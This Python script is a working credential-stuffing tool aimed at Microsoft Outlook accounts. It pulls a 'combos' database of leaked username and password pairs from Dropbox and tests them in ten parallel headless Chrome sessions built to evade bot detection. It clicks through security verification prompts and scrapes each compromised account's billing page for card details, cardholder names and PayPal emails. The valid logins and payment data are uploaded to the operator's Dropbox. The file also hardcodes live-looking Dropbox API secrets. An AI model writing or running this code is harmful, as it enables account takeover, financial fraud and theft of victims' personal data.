#!/usr/bin/env python3
"""
Outlook Login Automation Script with Threading and Dropbox Integration

This script downloads combos.db from Dropbox, processes accounts with threading,
and uploads results back to Dropbox.
"""

import sys
import time
import os
import re
import sqlite3
import threading
import requests
import json
from urllib.parse import quote
from datetime import datetime, timedelta
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup


class DropboxManager:
    """Handles Dropbox API operations for file upload/download."""
    
    def __init__(self):
        self.app_key = "xiqvlwoijni1jzz"
        self.app_secret = "1slbjrcclpdja5o"
        self.refresh_token = "KTOZyBrijzIAAAAAAAAAAeMR5qeHBwX8bPDXZWUhluU5kWrdkXU9DB33tisez-VU"
        self.access_token = None
        self.token_expires = None
        self.lock = threading.Lock()
    
    def refresh_access_token(self):
        """Refresh the access token using the refresh token."""
        with self.lock:
            if self.access_token and self.token_expires and datetime.now() < self.token_expires:
                return self.access_token
            
            url = "https://api.dropboxapi.com/oauth2/token"
            data = {
                'grant_type': 'refresh_token',
                'refresh_token': self.refresh_token,
                'client_id': self.app_key,
                'client_secret': self.app_secret
            }
            
            response = requests.post(url, data=data)
            if response.status_code == 200:
                token_data = response.json()
                self.access_token = token_data['access_token']
                expires_in = token_data.get('expires_in', 14400)  # Default 4 hours
                self.token_expires = datetime.now() + timedelta(seconds=expires_in - 300)  # Refresh 5 min early
                print(f"✅ Access token refreshed, expires at {self.token_expires}")
                return self.access_token
            else:
                print(f"❌ Failed to refresh access token: {response.text}")
                return None
    
    def download_file(self, dropbox_path, local_path):
        """Download a file from Dropbox."""
        token = self.refresh_access_token()
        if not token:
            return False
        
        url = "https://content.dropboxapi.com/2/files/download"
        headers = {
            'Authorization': f'Bearer {token}',
            'Dropbox-API-Arg': json.dumps({'path': dropbox_path})
        }
        
        response = requests.post(url, headers=headers)
        if response.status_code == 200:
            with open(local_path, 'wb') as f:
                f.write(response.content)
            print(f"✅ Downloaded {dropbox_path} to {local_path}")
            return True
        else:
            print(f"❌ Failed to download {dropbox_path}: {response.text}")
            return False
    
    def upload_file(self, local_path, dropbox_path):
        """Upload a file to Dropbox."""
        token = self.refresh_access_token()
        if not token:
            return False
        
        url = "https://content.dropboxapi.com/2/files/upload"
        headers = {
            'Authorization': f'Bearer {token}',
            'Dropbox-API-Arg': json.dumps({
                'path': dropbox_path,
                'mode': 'overwrite',
                'autorename': False
            }),
            'Content-Type': 'application/octet-stream'
        }
        
        with open(local_path, 'rb') as f:
            response = requests.post(url, headers=headers, data=f)
        
        if response.status_code == 200:
            print(f"✅ Uploaded {local_path} to {dropbox_path}")
            return True
        else:
            print(f"❌ Failed to upload {local_path}: {response.text}")
            return False


class DatabaseManager:
    """Handles database operations with proper locking."""
    
    def __init__(self, db_path):
        self.db_path = db_path
        self.lock = threading.Lock()
    
    def init_outlook_db(self):
        """Initialize the outlook.db database."""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS accounts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT NOT NULL,
                    password TEXT NOT NULL,
                    card_info TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            conn.commit()
            conn.close()
    
    def get_accounts_batch(self, batch_size=10):
        """Get a batch of Outlook accounts from combos.db and delete them."""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Get batch of Outlook accounts only from combos table
            cursor.execute('SELECT id, username, password FROM combos WHERE username LIKE "%@outlook%" LIMIT ?', (batch_size,))
            accounts = cursor.fetchall()
            
            if accounts:
                # Delete the fetched accounts
                account_ids = [str(account[0]) for account in accounts]
                cursor.execute(f'DELETE FROM combos WHERE id IN ({",".join(account_ids)})')
                conn.commit()
            
            conn.close()
            return [(account[1], account[2]) for account in accounts]  # Return (username, password) tuples
    
    def save_valid_account(self, email, password, card_info=None):
        """Save a valid account to outlook.db."""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            card_info_str = json.dumps(card_info) if card_info else None
            cursor.execute('''
                INSERT INTO accounts (email, password, card_info)
                VALUES (?, ?, ?)
            ''', (email, password, card_info_str))
            
            conn.commit()
            conn.close()
    
    def count_valid_accounts(self):
        """Count the number of valid accounts in outlook.db."""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM accounts')
            count = cursor.fetchone()[0]
            conn.close()
            return count


# Global variables for thread coordination
dropbox_manager = DropboxManager()
outlook_db_manager = DatabaseManager('outlook.db')
valid_count = 0
valid_count_lock = threading.Lock()


def construct_outlook_url(email):
    """
    Construct an Outlook login URL for the given email address.
    
    Args:
        email (str): The email address to use in the URL
        
    Returns:
        str: The constructed URL
    """
    # URL encode the email to handle special characters
    encoded_email = quote(email, safe='@.')
    
    # Construct the URL with the specified format
    url = f"https://login.live.com/login.srf?&username={encoded_email}&npc=7"
    
    return url


def save_valid_account(email, password, card_info=None):
    """
    Save a valid account to the outlook.db database and handle upload logic.
    
    Args:
        email (str): Email address
        password (str): Password
        card_info (list): List of card information
    """
    global valid_count
    
    # Save to database
    outlook_db_manager.save_valid_account(email, password, card_info)
    
    # Update valid count and check if we need to upload
    with valid_count_lock:
        valid_count += 1
        print(f"✅ Valid account saved: {email} (Total valid: {valid_count})")
        
        if valid_count % 50 == 0:
            print(f"🔄 Reached {valid_count} valid accounts, uploading to Dropbox...")
            upload_success = dropbox_manager.upload_file('outlook.db', '/outlook.db')
            if upload_success:
                print(f"✅ Successfully uploaded outlook.db with {valid_count} accounts")
            else:
                print(f"❌ Failed to upload outlook.db")





def extract_payment_info(driver):
    """
    Extract payment/card information from Microsoft account billing page.
    
    Args:
        driver: Selenium WebDriver instance
        
    Returns:
        list: List of payment method information
    """
    payment_info = []
    try:
        # Navigate to billing/payments page (maintaining same session)
        billing_url = "https://account.microsoft.com/billing/payments?lang=en-US#main-content-landing-react"
        print(f"🔗 Navigating to billing page: {billing_url}")
        driver.get(billing_url)
        time.sleep(8)  # Wait longer for page to load completely
        
        # Get page source and parse with BeautifulSoup
        soup = BeautifulSoup(driver.page_source, 'html.parser')
        
        # Helper function to extract expiry dates
        def extract_expiry_date(text):
            """Extract expiry date from text and format consistently."""
            if 'expiring' in text.lower():
                exp_part = text.lower().split('expiring')[1].strip()
                exp_date = exp_part.split('with')[0].strip() if 'with' in exp_part else exp_part
                return f"Expires: {exp_date}"
            elif 'exp.' in text.lower() and '/' in text:
                return text if text.startswith('Exp.') else f"Exp. {text}"
            elif '/' in text and len(text) <= 10 and any(char.isdigit() for char in text):
                return f"Exp. {text}"
            return None
        
        # Helper function to validate cardholder names
        def is_valid_name(text):
            """Check if text looks like a valid cardholder name."""
            if not text or len(text) <= 2 or any(char.isdigit() for char in text) or '••••' in text:
                return False
            # Check if it looks like a name (contains letters and possibly spaces)
            clean_text = text.replace(' ', '').replace('.', '')
            return clean_text.isalpha() and len(text.split()) <= 4
        
        # Look for payment method containers with aria-label containing card info
        payment_containers = soup.find_all('div', {'aria-label': lambda x: x and ('visa' in x.lower() or 'paypal' in x.lower() or 'mastercard' in x.lower() or 'ending in' in x.lower())})
        
        for container in payment_containers:
            aria_label = container.get('aria-label', '')
            
            # Extract card information from aria-label
            if 'visa' in aria_label.lower() or 'mastercard' in aria_label.lower():
                if 'ending in' in aria_label.lower():
                    # Get the card type and last 4 digits
                    parts = aria_label.lower().split('ending in')
                    card_type = parts[0].strip().title()
                    
                    # Extract the digits after "ending in"
                    remaining = parts[1].strip()
                    digits_part = remaining.split('expiring')[0].strip() if 'expiring' in remaining else remaining.split('with')[0].strip()
                    # Remove spaces and get last 4 digits
                    digits = ''.join(digits_part.split())[:4]
                    
                    payment_info.append(f"{card_type} •••• {digits}")
                    
                    # Extract expiry date from aria-label
                    expiry = extract_expiry_date(aria_label)
                    if expiry:
                        payment_info.append(expiry)
                
                # Look for cardholder name in span elements
                name_spans = container.find_all('span', class_='css-303')
                for name_span in name_spans:
                    name_text = name_span.get_text(strip=True)
                    if is_valid_name(name_text):
                        payment_info.append(f"Cardholder: {name_text}")
                
                # Look for expiry in span elements (avoiding duplicates)
                exp_spans = container.find_all('span', class_='css-304')
                for exp_span in exp_spans:
                    exp_text = exp_span.get_text(strip=True)
                    expiry = extract_expiry_date(exp_text)
                    if expiry and expiry not in payment_info:
                        payment_info.append(expiry)
            
            elif 'paypal' in aria_label.lower():
                payment_info.append('PayPal Account')
                
                # Look for PayPal email in span elements
                paypal_spans = container.find_all('span', class_='css-304')
                for span in paypal_spans:
                    span_text = span.get_text(strip=True)
                    if '@' in span_text and '.' in span_text:
                        payment_info.append(f"PayPal Email: {span_text}")
        
        # Look for additional card information using regex patterns
        all_text = soup.get_text()
        
        # Extract card patterns like "Visa •••• 3502" or "Mastercard •••• 1234"
        card_patterns = [
            r'Visa\s*••••\s*\d{4}',
            r'Mastercard\s*••••\s*\d{4}'
        ]
        
        for pattern in card_patterns:
            matches = re.findall(pattern, all_text, re.IGNORECASE)
            for match in matches:
                clean_match = re.sub(r'\s+', ' ', match.strip())
                if clean_match not in payment_info:
                    payment_info.append(clean_match)
        
        # Look for card numbers in span elements with specific classes
        card_number_spans = soup.find_all('span', class_='css-312')
        for span in card_number_spans:
            card_text = span.get_text(strip=True)
            if '••••' in card_text and card_text not in payment_info:
                payment_info.append(card_text)
        
        # Remove duplicates while preserving order
        payment_info = list(dict.fromkeys(payment_info))
        
    except Exception as e:
        print(f"Error extracting payment info: {e}")
    
    return payment_info


def handle_microsoft_account(driver, email, password):
    """
    Handle Microsoft account after successful login - extract payment info.
    
    Args:
        driver: Selenium WebDriver instance
        email (str): Email address
        password (str): Password
        
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        print(f"🔍 Extracting account information for {email}")
        print(f"🌐 Current URL: {driver.current_url}")
        
        # Wait a moment to ensure we're fully logged in
        time.sleep(3)
        
        # Extract payment information
        print(f"💳 Extracting payment information for {email}")
        payment_info = extract_payment_info(driver)
        if payment_info:
            print(f"✅ Found {len(payment_info)} payment method(s) for {email}: {', '.join(payment_info[:3])}{'...' if len(payment_info) > 3 else ''}")
        else:
            print(f"ℹ️  No payment methods found for {email}")
        
        # Save to database
        save_valid_account(email, password, payment_info)
        
        return True
        
    except Exception as e:
        print(f"❌ Error handling Microsoft account for {email}: {e}")
        return False


def setup_driver():
    """
    Set up Chrome WebDriver with appropriate options.
    
    Returns:
        webdriver.Chrome: Configured Chrome driver
    """
    chrome_options = Options()
    
    # Essential options for containerized environments
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-plugins")
    chrome_options.add_argument("--disable-images")
    # chrome_options.add_argument("--disable-javascript")  # Don't disable JS as we need it for login
    chrome_options.add_argument("--disable-web-security")
    chrome_options.add_argument("--allow-running-insecure-content")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--ignore-ssl-errors")
    chrome_options.add_argument("--ignore-certificate-errors-spki-list")
    chrome_options.add_argument("--disable-background-timer-throttling")
    chrome_options.add_argument("--disable-backgrounding-occluded-windows")
    chrome_options.add_argument("--disable-renderer-backgrounding")
    chrome_options.add_argument("--disable-features=TranslateUI")
    chrome_options.add_argument("--disable-ipc-flooding-protection")
    
    # Run in headless mode for containerized environment
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--remote-debugging-port=9222")
    
    # Anti-detection options
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    
    # User agent
    chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36")
    
    try:
        # Use webdriver-manager to automatically manage ChromeDriver
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        return driver
    except Exception as e:
        print(f"Error setting up Chrome driver: {e}")
        raise


def process_login(driver, email, password):
    """
    Process a single login attempt.
    
    Args:
        driver: Selenium WebDriver instance
        email (str): Email address
        password (str): Password
        
    Returns:
        bool: True if login was successful, False otherwise
    """
    try:
        # Navigate to the login URL
        url = construct_outlook_url(email)
        print(f"Processing: {email}")
        print(f"URL: {url}")
        
        driver.get(url)
        
        # Wait for page to load
        time.sleep(3)
        
        # Look for the "Use your password" button
        try:
            # Try multiple selectors for the "Use your password" button
            use_password_selectors = [
                "//span[contains(text(), 'Use your password')]",
                "//span[contains(text(), 'use your password')]",
                "//span[contains(text(), 'Use password')]",
                "//a[contains(text(), 'Use your password')]",
                "//button[contains(text(), 'Use your password')]"
            ]
            
            use_password_button = None
            for selector in use_password_selectors:
                try:
                    use_password_button = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    break
                except TimeoutException:
                    continue
            
            if not use_password_button:
                print(f"❌ Invalid account: {email} - 'Use your password' button not found")
                return False
            
            print(f"✅ Found 'Use your password' button for {email}")
            use_password_button.click()
            time.sleep(2)
            
        except Exception as e:
            print(f"❌ Invalid account: {email} - Error finding 'Use your password' button: {e}")
            return False
        
        # Look for password field
        try:
            # Try multiple selectors for the password field
            password_selectors = [
                "#passwordEntry",
                "input[type='password']",
                "input[name='passwd']",
                "input[placeholder*='password']",
                "input[placeholder*='Password']"
            ]
            
            password_field = None
            for selector in password_selectors:
                try:
                    password_field = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    break
                except TimeoutException:
                    continue
            
            if not password_field:
                print(f"❌ Password field not found for {email}")
                return False
            
            print(f"✅ Found password field for {email}")
            password_field.clear()
            password_field.send_keys(password)
            time.sleep(1)
            
        except Exception as e:
            print(f"❌ Error finding password field for {email}: {e}")
            return False
        
        # Look for submit button
        try:
            # Try multiple selectors for the submit button
            submit_selectors = [
                "button[type='submit']",
                "button[data-testid='primaryButton']",
                "input[type='submit']",
                "button:contains('Next')",
                "button:contains('Sign in')",
                "#idSIButton9"
            ]
            
            submit_button = None
            for selector in submit_selectors:
                try:
                    submit_button = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                    )
                    break
                except TimeoutException:
                    continue
            
            if not submit_button:
                print(f"❌ Submit button not found for {email}")
                return False
            
            print(f"✅ Found submit button for {email}")
            submit_button.click()
            print(f"🔄 Login submitted for {email}, waiting 10 seconds for response...")
            time.sleep(10)  # Wait 10 seconds after clicking login
            
            
            # Check the redirect URL to determine account status
            current_url = driver.current_url
            print(f"🔍 Current URL after login: {current_url}")
            
            # Check for locked account
            if "account.live.com/Abuse" in current_url:
                print(f"🔒 Account locked: {email}")
                return False
            
            # Check for security verification page
            elif "login.live.com/ppsecure" in current_url:
                print(f"🔐 Security verification required for: {email}")
                try:
                    # Look for and click the "Yes" button
                    yes_button = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, "button[data-testid='primaryButton']"))
                    )
                    if yes_button and "yes" in yes_button.text.lower():
                        yes_button.click()
                        print(f"✅ Clicked 'Yes' button for {email}")
                        time.sleep(5)  # Wait for redirect
                        
                        # Check new URL after clicking Yes
                        new_url = driver.current_url
                        print(f"🔍 URL after clicking Yes: {new_url}")
                        
                        if "account.microsoft.com" in new_url:
                            return handle_microsoft_account(driver, email, password)
                        else:
                            print(f"❌ Unexpected redirect after security verification for {email}")
                            return False
                    else:
                        print(f"❌ Could not find 'Yes' button for {email}")
                        return False
                        
                except Exception as e:
                    print(f"❌ Error handling security verification for {email}: {e}")
                    return False
            
            # Check for successful login to Microsoft account
            elif "account.microsoft.com" in current_url:
                print(f"✅ Successfully logged into Microsoft account: {email}")
                return handle_microsoft_account(driver, email, password)
            
            # Check if still on login page (failed login)
            elif "login" in current_url.lower():
                print(f"❌ Login failed for {email}")
                return False
            
            else:
                print(f"✅ Login successful for {email}")
                return True
            
        except Exception as e:
            print(f"❌ Error clicking submit button for {email}: {e}")
            return False
    
    except Exception as e:
        print(f"❌ General error processing {email}: {e}")
        return False


def worker_thread(thread_id, combos_db_manager):
    """Worker thread function to process accounts."""
    print(f"🧵 Thread {thread_id} started")
    
    while True:
        # Get batch of accounts
        accounts = combos_db_manager.get_accounts_batch(1)  # Get 1 account at a time per thread
        
        if not accounts:
            print(f"🧵 Thread {thread_id}: No more accounts to process")
            break
        
        email, password = accounts[0]
        print(f"🧵 Thread {thread_id}: Processing {email}")
        
        # Set up WebDriver for this thread
        driver = None
        try:
            driver = setup_driver()
            success = process_login(driver, email, password)
            
            if success:
                print(f"🧵 Thread {thread_id}: ✅ Success for {email}")
            else:
                print(f"🧵 Thread {thread_id}: ❌ Failed for {email}")
                
        except Exception as e:
            print(f"🧵 Thread {thread_id}: ❌ Error processing {email}: {e}")
        finally:
            if driver:
                driver.quit()
        
        time.sleep(2)  # Brief pause between attempts
    
    print(f"🧵 Thread {thread_id} finished")


def main():
    """Main function with threading and Dropbox integration."""
    
    print("Outlook Login Automation Script with Threading and Dropbox")
    print("=" * 60)
    
    # Download combos.db from Dropbox
    print("🔄 Downloading combos.db from Dropbox...")
    if not dropbox_manager.download_file('/combos.db', 'combos.db'):
        print("❌ Failed to download combos.db from Dropbox")
        sys.exit(1)
    
    # Initialize databases
    combos_db_manager = DatabaseManager('combos.db')
    outlook_db_manager.init_outlook_db()
    
    # Check how many Outlook accounts we have
    conn = sqlite3.connect('combos.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM combos WHERE username LIKE "%@outlook%"')
    total_accounts = cursor.fetchone()[0]
    conn.close()
    
    if total_accounts == 0:
        print("❌ No Outlook accounts found in combos.db")
        sys.exit(1)
    
    print(f"📊 Found {total_accounts} accounts to process")
    print("-" * 60)
    
    # Start token refresh timer
    def token_refresh_timer():
        while True:
            time.sleep(3600)  # Refresh every hour
            dropbox_manager.refresh_access_token()
    
    refresh_thread = threading.Thread(target=token_refresh_timer, daemon=True)
    refresh_thread.start()
    
    # Create and start worker threads
    threads = []
    num_threads = 10
    
    print(f"🚀 Starting {num_threads} worker threads...")
    
    for i in range(num_threads):
        thread = threading.Thread(target=worker_thread, args=(i+1, combos_db_manager))
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    # Final upload of outlook.db if there are any remaining valid accounts
    final_count = outlook_db_manager.count_valid_accounts()
    if final_count > 0:
        print(f"🔄 Final upload: {final_count} total valid accounts")
        dropbox_manager.upload_file('outlook.db', '/outlook.db')
    
    print("\n" + "=" * 60)
    print("PROCESSING COMPLETE")
    print("=" * 60)
    print(f"Total valid accounts found: {valid_count}")
    print("✅ outlook.db uploaded to Dropbox")


if __name__ == "__main__":
    main()